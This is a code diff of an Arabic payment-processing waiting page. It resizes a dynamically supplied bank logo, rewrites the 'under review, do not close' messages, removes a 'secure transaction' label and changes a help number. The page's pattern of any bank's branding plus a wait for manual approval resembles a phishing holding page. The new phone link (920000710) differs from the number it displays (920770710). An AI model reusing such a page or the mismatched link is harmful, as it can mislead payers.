@@ -7,8 +7,8 @@
 
             <!-- Bank Logo -->
             <div v-if="bankLogo"
-                class="absolute top-4 left-4 z-10 bg-white/90 backdrop-blur-sm rounded-lg px-2.5 py-1 border border-slate-200 shadow-sm">
-                <img :src="bankLogo" alt="Bank logo" class="h-5 sm:h-6 object-contain" />
+                class="absolute top-4 left-4 z-10 bg-white/90 backdrop-blur-sm rounded-lg px-3 py-1.5 border border-slate-200 shadow-sm">
+                <img :src="bankLogo" alt="Bank logo" class="h-8 sm:h-10 w-auto object-contain" />
             </div>
 
             <!-- Main Content -->
@@ -38,16 +38,16 @@
                 </div>
 
                 <!-- Title -->
-                <h1 class="text-xl sm:text-2xl font-bold text-foreground mb-2">جارٍ معالجة عملية الدفع</h1>
-                <p class="text-sm sm:text-base text-slate-600">يتم الآن تأكيد العملية، يرجى الانتظار وعدم إغلاق الصفحة</p>
+                <h1 class="text-xl sm:text-2xl font-bold text-foreground mb-2">جاري مراجعة طلب الدفع</h1>
+                <p class="text-sm sm:text-base text-slate-600">تم استلام بيانات العملية، ويتم التحقق من الحالة الآن. يرجى الانتظار وعدم إغلاق الصفحة.</p>
 
-                <!-- Bank Verification Notice -->
+                <!-- Review Notice -->
                 <div v-if="paymentStatus !== 'approved' && paymentStatus !== 'rejected'" class="mt-6 bg-sky-50 border border-sky-200 rounded-xl p-4">
                     <div class="flex items-start gap-3">
                         <div class="text-right flex-1">
-                            <p class="text-sm font-semibold text-sky-800 mb-1">توثيق العملية</p>
+                            <p class="text-sm font-semibold text-sky-800 mb-1">مراجعة الطلب</p>
                             <p class="text-xs sm:text-sm text-sky-700 leading-relaxed">
-                                قد يتطلب البنك التحقق من العملية عبر وسيلة التوثيق المعتادة لديك. يُرجى متابعة تعليمات البنك لإكمال الدفع.
+                                قد تستغرق عملية التحقق لحظات قليلة. في حال الحاجة إلى إجراء إضافي، سيتم توجيهك تلقائيًا للخطوة التالية.
                             </p>
                         </div>
                     </div>
@@ -134,7 +134,6 @@
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                         d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                 </svg>
-                <span class="text-xs">معاملة آمنة ومشفرة</span>
             </div>
         </div>
 
@@ -142,7 +141,7 @@
         <div class="mt-5 text-center">
             <p class="text-xs text-muted">
                 للمساعدة أو الاستفسار:
-                <a href="tel:920000000" class="text-secondary font-bold hover:underline mr-1">920000000</a>
+                <a href="tel:920000710" class="text-secondary font-bold hover:underline mr-1">920770710</a>
             </p>
         </div>
         </div>
